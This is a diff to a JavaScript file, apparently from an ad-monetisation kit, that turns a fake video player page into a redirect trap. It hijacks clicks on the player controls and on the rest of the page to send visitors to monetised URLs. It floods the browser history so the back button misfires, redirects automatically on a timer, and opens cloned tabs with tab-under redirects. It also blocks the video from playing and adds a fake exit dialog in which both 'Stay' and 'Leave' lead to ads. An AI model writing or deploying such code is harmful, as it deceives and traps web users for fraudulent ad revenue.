@@ -1,8 +1,8 @@
-/* common.js — vanisher-style micro handoff (FINAL v4)
-   Fixes:
-   - Added setTimeout(40ms) to replaceTo when history is pushed. 
-     This prevents the browser from choking on simultaneous history+redirect actions.
-   - Used stopImmediatePropagation to kill video play attempts on exit click.
+/* common.js — vanisher-style micro handoff (FINAL v6 - MODAL EDITION)
+   Logic:
+   - "Back" button -> Shows Modal.
+   - Modal "Stay" -> MicroHandoff (Clone + Tabunder).
+   - Modal "Leave" -> Custom Dual Exit (2 extra zones).
 */
 
 (() => {
@@ -14,17 +14,21 @@
   const safe = (fn) => { try { return fn(); } catch { return undefined; } };
   const err  = (...a) => safe(() => console.error(...a));
 
-  // Обычный редирект
   const replaceTo = (url) => {
     try { window.location.replace(url); } catch { window.location.href = url; }
   };
 
-  // Открытие вкладки (popup safe)
+  // --- SMOOTH OPEN TAB (Black Background Hack) ---
   const openTab = (url) => {
     try {
-      const w = window.open("about:blank", "_blank");
+      const w = window.open("", "_blank");
       if (w) {
         try { w.opener = null; } catch {}
+        try {
+            w.document.open();
+            w.document.write(`<!DOCTYPE html><html style="background:#000;margin:0;padding:0;overflow:hidden;height:100%"><body style="background:#000;"></body></html>`);
+            w.document.close();
+        } catch {}
         try { w.location.replace(url); } catch { try { w.location.href = url; } catch {} }
       }
       return w || null;
@@ -38,7 +42,6 @@
   // ---------------------------
   const curUrl = new URL(window.location.href);
   const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;
-
   const CLONE_PARAM = "__cl";
   const isClone = getSP(CLONE_PARAM) === "1";
 
@@ -68,9 +71,7 @@
       if (!nav.userAgentData?.getHighEntropyValues) return "";
       const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
       return v?.platformVersion || "";
-    } catch {
-      return "";
-    }
+    } catch { return ""; }
   };
   let osVersionCached = "";
   safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));
@@ -84,9 +85,7 @@
         templateHash: window.templateHash || "",
       };
       return btoa(JSON.stringify(payload));
-    } catch {
-      return "";
-    }
+    } catch { return ""; }
   };
 
   // ---------------------------
@@ -99,6 +98,8 @@
 
     Object.entries(appCfg).forEach(([k, v]) => {
       if (v == null || v === "" || k === "domain") return;
+      
+      // Ловит любые ключи вида customName_currentTab_zoneId
       let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
       if (m) {
         const [, name, tab, field] = m;
@@ -147,15 +148,13 @@
   };
 
   // ---------------------------
-  // Back Logic
+  // Back Logic & Exits
   // ---------------------------
   const pushBackStates = (url, count) => {
     try {
       const n = Math.max(0, parseInt(count, 10) || 0);
       const originalUrl = window.location.href;
-      for (let i = 0; i < n; i++) {
-        window.history.pushState(null, "Please wait...", url);
-      }
+      for (let i = 0; i < n; i++) { window.history.pushState(null, "Please wait...", url); }
       window.history.pushState(null, document.title, originalUrl);
     } catch (e) { err("Back pushState error:", e); }
   };
@@ -181,9 +180,6 @@
     pushBackStates(page.toString(), count);
   };
 
-  // ---------------------------
-  // Exits (ГЛАВНЫЙ ФИКС ЗДЕСЬ)
-  // ---------------------------
   const resolveUrlFast = (ex, cfg) => {
     if (!ex) return "";
     if (ex.url) return String(ex.url);
@@ -196,17 +192,9 @@
     if (!ex) return;
     const url = resolveUrlFast(ex, cfg);
     if (!url) return;
-
     safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));
-    
-    // --- ВАЖНО: Задержка 40мс перед редиректом ---
-    if (withBack) {
-        initBackFast(cfg);
-        // Даем браузеру переварить историю
-        setTimeout(() => replaceTo(url), 40); 
-    } else {
-        replaceTo(url);
-    }
+    if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
+    else { replaceTo(url); }
   };
 
   const runExitDualTabsFast = (cfg, name, withBack = true) => {
@@ -224,11 +212,7 @@
 
     if (withBack) initBackFast(cfg);
     if (ntUrl) openTab(ntUrl);
-    
-    if (ctUrl) {
-        // Тоже задержка для надежности
-        setTimeout(() => replaceTo(ctUrl), 40);
-    }
+    if (ctUrl) { setTimeout(() => replaceTo(ctUrl), 40); }
   };
 
   const run = (cfg, name) => {
@@ -240,23 +224,19 @@
   };
 
   // ---------------------------
-  // Reverse & Autoexit
+  // Reverse, Autoexit, Ready
   // ---------------------------
   const initReverse = (cfg) => {
     if (!cfg?.reverse?.currentTab) return;
     safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
-    window.addEventListener("popstate", () => {
-      runExitCurrentTabFast(cfg, "reverse", false);
-    });
+    window.addEventListener("popstate", () => { runExitCurrentTabFast(cfg, "reverse", false); });
   };
 
   const initAutoexit = (cfg) => {
     if (!cfg?.autoexit?.currentTab) return;
     const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
     let armed = false;
-    const trigger = () => {
-      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
-    };
+    const trigger = () => { if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true); };
     const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);
     const cancel = () => { clearTimeout(timer); document.removeEventListener("visibilitychange", trigger); };
     document.addEventListener("visibilitychange", trigger);
@@ -276,6 +256,8 @@
     const u = new URL(window.location.href);
     u.searchParams.set(CLONE_PARAM, "1");
     u.searchParams.set("__skipPreview", "1");
+    const video = document.querySelector("video");
+    if (video && video.poster) { u.searchParams.set("__poster", video.poster); }
     return u.toString();
   };
 
@@ -286,42 +268,58 @@
 
     const cloneUrl = buildCloneUrl();
     safe(() => window.syncMetric?.({ event: "micro_open_clone" }));
-    openTab(cloneUrl);
+    openTab(cloneUrl); // Open clone
 
     const ex = cfg?.tabUnderClick?.newTab || cfg?.tabUnderClick?.currentTab;
     const monetUrl = resolveUrlFast(ex, cfg);
     if (monetUrl) {
       safe(() => window.syncMetric?.({ event: "tabUnderClick" }));
       initBackFast(cfg);
-      setTimeout(() => replaceTo(monetUrl), 40); // Timeout здесь тоже
+      setTimeout(() => replaceTo(monetUrl), 40);
     } else {
       run(cfg, "mainExit");
     }
   };
 
   // ---------------------------
-  // Click Map (СБОР СОБЫТИЙ И БЛОКИРОВКА ВИДЕО)
+  // Click Map (MODAL LOGIC ADDED)
   // ---------------------------
   const initClickMap = (cfg) => {
     const fired = { mainExit: false, back: false };
     const microTargets = new Set(["timeline", "play_pause", "mute_unmute", "settings", "fullscreen", "pip_top", "pip_bottom"]);
 
-    // useCapture = true — мы ловим событие ДО того, как оно дойдет до видео
     document.addEventListener("click", (e) => {
       const zone = e.target?.closest?.("[data-target]");
       const t = zone?.getAttribute("data-target") || "";
 
-      // Back Button
+      // 1. BACK BUTTON CLICK -> SHOW MODAL
       if (t === "back_button") {
-        if (fired.back) return;
-        fired.back = true;
-        // Убиваем остальные обработчики
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
-        runExitCurrentTabFast(cfg, "back", true);
+        const modal = document.getElementById("xh_exit_modal");
+        if (modal) modal.style.display = "flex";
         return;
       }
 
-      // Clone -> MainExit
+      // 2. MODAL: "STAY" CLICK -> MicroHandoff
+      if (t === "modal_stay") {
+        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+        const modal = document.getElementById("xh_exit_modal");
+        if (modal) modal.style.display = "none";
+        runMicroHandoff(cfg); // Ведем себя как микро-клик
+        return;
+      }
+
+      // 3. MODAL: "LEAVE" CLICK -> Custom Back Exit
+      if (t === "modal_leave") {
+         if (fired.back) return;
+         fired.back = true;
+         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
+         // Запускаем выход на 2 новые зоны
+         run(cfg, "customBackExit");
+         return;
+      }
+
+      // 4. CLONE -> Main Exit
       if (isClone) {
         if (fired.mainExit) return;
         fired.mainExit = true;
@@ -330,22 +328,17 @@
         return;
       }
 
-      // Micro
+      // 5. MICRO CONTROLS -> MicroHandoff
       if (microTargets.has(t)) {
         e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
         runMicroHandoff(cfg);
         return;
       }
 
-      // Main Exit (Любой другой клик)
+      // 6. MAIN EXIT (Everything else)
       if (fired.mainExit) return;
       fired.mainExit = true;
-      
-      // БЛОКИРУЕМ ЗАПУСК ВИДЕО
-      e.preventDefault(); 
-      e.stopPropagation();
-      e.stopImmediatePropagation(); 
-
+      e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation(); 
       run(cfg, "mainExit");
     }, true); 
   };
